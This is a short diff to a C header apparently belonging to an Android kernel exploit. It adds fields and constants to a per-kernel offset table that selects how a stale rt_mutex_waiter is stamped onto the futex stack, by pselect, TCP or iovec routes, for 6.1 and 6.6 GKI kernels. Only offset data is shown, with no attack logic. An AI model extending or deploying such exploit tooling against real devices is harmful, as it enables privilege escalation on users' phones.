@@ -22,11 +22,22 @@ struct kernel_offsets {
 
   /* rt_mutex_waiter layout: 0 = 6.6 rb_node, 1 = 6.1 compact tree_entry */
   uint8_t compact_waiter;
+  /* Stale-waiter transport; see WAITER_ROUTE_* below. compact_waiter still
+   * picks the tcp route on its own for the 6.1 tables. */
+  uint8_t waiter_route;
+  /* WAITER_ROUTE_IOV: byte distance from the stale waiter to __sys_sendmsg's
+   * iovstack. */
+  int16_t iov_waiter_off;
   /* mm_struct SLUB stride; 0 uses target.h default (6.6 GKI 0x500).
    * android14-6.1 uses 0x400 (BTF reports 0x3c0). */
   uint32_t mm_struct_sz;
-  uint32_t _pad[3];
+  uint32_t _pad[2];
 };
+
+/* Transport that stamps the stale rt_mutex_waiter on the futex stack. */
+#define WAITER_ROUTE_PSELECT 0
+#define WAITER_ROUTE_TCP     1
+#define WAITER_ROUTE_IOV     2
 
 #define OFFSETS_ENTRY(uname, ...) { .uname_r = uname, __VA_ARGS__ }
 
